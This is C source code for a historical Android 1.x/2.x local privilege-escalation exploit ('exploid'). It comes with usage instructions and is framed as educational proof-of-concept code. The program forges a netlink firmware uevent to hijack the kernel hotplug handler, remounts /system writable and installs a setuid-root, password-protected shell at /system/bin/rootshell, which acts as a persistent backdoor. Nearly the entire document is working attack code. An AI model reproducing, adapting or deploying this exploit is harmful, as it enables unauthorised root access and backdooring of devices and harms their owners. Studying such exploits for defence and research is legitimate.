/* android 1.x/2.x the real youdev feat. init local root exploit.
 * (C) 2009/2010 by The Android Exploid Crew.
 *
 * Copy from sdcard to /sqlite_stmt_journals/exploid, chmod 0755 and run.
 * Or use /data/local/tmp if available (thx to ioerror!) It is important to
 * to use /sqlite_stmt_journals directory if available.
 * Then try to invoke hotplug by clicking Settings->Wireless->{Airplane,WiFi etc}
 * or use USB keys etc. This will invoke hotplug which is actually
 * our exploit making /system/bin/rootshell.
 * This exploit requires /etc/firmware directory, e.g. it will
 * run on real devices and not inside the emulator.
 * I'd like to have this exploitet by using the same blockdevice trick
 * as in udev, but internal structures only allow world writable char
 * devices, not block devices, so I used the firmware subsystem.
 *
 * !!!This is PoC code for educational purposes only!!!
 * If you run it, it might crash your device and make it unusable!
 * So you use it at your own risk!
 *
 * Thx to all the TAEC supporters.
 */
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/netlink.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <signal.h>
#include <sys/mount.h>


// CHANGE!
#define SECRET "secret"


void die(const char *msg)
{
	perror(msg);
	exit(errno);
}


void copy(const char *from, const char *to)
{
	int fd1, fd2;
	char buf[0x1000];
	ssize_t r = 0;

	if ((fd1 = open(from, O_RDONLY)) < 0)
		die("[-] open");
	if ((fd2 = open(to, O_RDWR|O_CREAT|O_TRUNC, 0600)) < 0)
		die("[-] open");
	for (;;) {
		r = read(fd1, buf, sizeof(buf));
		if (r < 0)
			die("[-] read");
		if (r == 0)
			break;
		if (write(fd2, buf, r) != r)
			die("[-] write");
	}

	close(fd1);
	close(fd2);
	sync(); sync();
}


void clear_hotplug()
{
	int ofd = open("/proc/sys/kernel/hotplug", O_WRONLY|O_TRUNC);
	write(ofd, "", 1);
	close(ofd);
}


void rootshell(char **env)
{
	char pwd[128];
	char *sh[] = {"/system/bin/sh", 0};

	memset(pwd, 0, sizeof(pwd));
	readlink("/proc/self/fd/0", pwd, sizeof(pwd));
	if (strncmp(pwd, "/dev/pts/", 9) != 0)
		die("[-] memory tricks");

	write(1, "Password (echoed):", 18);
	memset(pwd, 0, sizeof(pwd));
	read(0, pwd, sizeof(pwd) - 1);
	sleep(2);

	if (strlen(pwd) < 6)
		die("[-] password too short");
	if (memcmp(pwd, SECRET, strlen(SECRET)) != 0)
		die("[-] wrong password");

	setuid(0); setgid(0);
	execve(*sh, sh, env);
	die("[-] execve");
}


int main(int argc, char **argv, char **env)
{
	char buf[512], path[512];
	int ofd;
	struct sockaddr_nl snl;
	struct iovec iov = {buf, sizeof(buf)};
	struct msghdr msg = {&snl, sizeof(snl), &iov, 1, NULL, 0, 0};
	int sock;
	char *basedir = NULL;


	/* I hope there is no LD_ bug in androids rtld :) */
	if (geteuid() == 0 && getuid() != 0)
		rootshell(env);

	if (readlink("/proc/self/exe", path, sizeof(path)) < 0)
		die("[-] readlink");

	if (geteuid() == 0) {
		clear_hotplug();
		/* remount /system rw */
		if (mount("/dev/mtdblock0", "/system", "yaffs2", MS_REMOUNT, 0) < 0)
			mount("/dev/mtdblock0", "/system", "yaffs", MS_REMOUNT, 0);
		copy(path, "/system/bin/rootshell");
		chmod("/system/bin/rootshell", 04711);
		for (;;);
	}

	printf("[*] Android local root exploid (C) The Android Exploid Crew\n");

	basedir = "/sqlite_stmt_journals";
	if (chdir(basedir) < 0) {
		basedir = "/data/local/tmp";
		if (chdir(basedir) < 0)
			basedir = strdup(getcwd(buf, sizeof(buf)));
	}
	printf("[+] Using basedir=%s, path=%s\n", basedir, path);
	printf("[+] opening NETLINK_KOBJECT_UEVENT socket\n");

	memset(&snl, 0, sizeof(snl));
	snl.nl_pid = 1;
	snl.nl_family = AF_NETLINK;

	if ((sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT)) < 0)
		die("[-] socket");

	close(creat("loading", 0666));
	if ((ofd = creat("hotplug", 0644)) < 0)
		die("[-] creat");
	if (write(ofd, path , strlen(path)) < 0)
		die("[-] write");
	close(ofd);
	symlink("/proc/sys/kernel/hotplug", "data");
	snprintf(buf, sizeof(buf), "ACTION=add%cDEVPATH=/..%s%c"
	         "SUBSYSTEM=firmware%c"
	         "FIRMWARE=../../..%s/hotplug%c", 0, basedir, 0, 0, basedir, 0);
	printf("[+] sending add message ...\n");
	if (sendmsg(sock, &msg, 0) < 0)
		die("[-] sendmsg");
	close(sock);
	printf("[*] Try to invoke hotplug now, clicking at the wireless\n"
	       "[*] settings, plugin USB key etc.\n"
	       "[*] You succeeded if you find /system/bin/rootshell.\n"
	       "[*] GUI might hang/restart meanwhile so be patient.\n");
	sleep(3);
	return 0;
}

